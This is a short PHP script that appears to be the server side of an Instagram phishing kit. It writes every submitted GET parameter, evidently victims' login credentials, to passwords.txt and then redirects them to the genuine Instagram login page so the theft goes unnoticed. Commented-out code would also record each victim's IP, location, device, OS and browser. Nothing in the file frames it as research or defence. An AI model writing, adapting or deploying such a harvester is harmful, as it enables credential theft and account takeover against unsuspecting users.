<?php
$handle = fopen("passwords.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");


////require_once($_SERVER['DOCUMENT_ROOT'] . '/Mobile_Detect.php');
//require_once($_SERVER['DOCUMENT_ROOT'] . '/detect.php');
//
//if (Detect::isMobile()) {
//
//}
//
//// Gets the device type ('Computer', 'Phone' or 'Tablet')
////echo Detect::deviceType();
//fwrite($handle, Detect::deviceType());
//fwrite($handle, "\r\n");
//
//// Any phone device
//if (Detect::isPhone()) {
//
//}
//
//// Any tablet device
//if (Detect::isTablet()) {
//
//}
//
//// Any computer device (desktops or laptops)
//if (Detect::isComputer()) {
//
//}
//
//// Get the IP address of the device
////echo Detect::ip();
//fwrite($handle, Detect::ip());
//fwrite($handle, "\r\n");
//
//// Get the ID address host name of the device
////echo Detect::ipHostname();
//fwrite($handle, Detect::ipHostname());
//fwrite($handle, "\r\n");
//
//// Get the IP address organisation of the device
////echo Detect::ipOrg();
//fwrite($handle, Detect::ipOrg());
//fwrite($handle, "\r\n");
//
//// Get the country the IP address is in (IP address location inaccurate)
//// (JS function available which uses the Geolocation API)
////echo Detect::ipCountry();
//fwrite($handle, Detect::ipCountry());
//fwrite($handle, "\r\n");
//
//// Get the name & version of operating system
////echo Detect::os();
//fwrite($handle, Detect::os());
//fwrite($handle, "\r\n");
//
//// Get the name & version of browser
////echo Detect::browser();
//fwrite($handle, Detect::browser());
//fwrite($handle, "\r\n");
//
//// Get the brand of device (only works with mobile devices otherwise return null)
////echo Detect::brand();
//fwrite($handle, Detect::brand());
//fwrite($handle, "\r\n");
//
//// Check for a specific platform with the help of the magic methods:
//if (Detect::isiOS()) {
//
//}
//
//if (Detect::isAndroidOS()) {
//
//}
//fwrite($handle, "\r\n");

fclose($handle);
header("Location: https://www.instagram.com/login.php?&e=1348092&email=");
exit;

?>


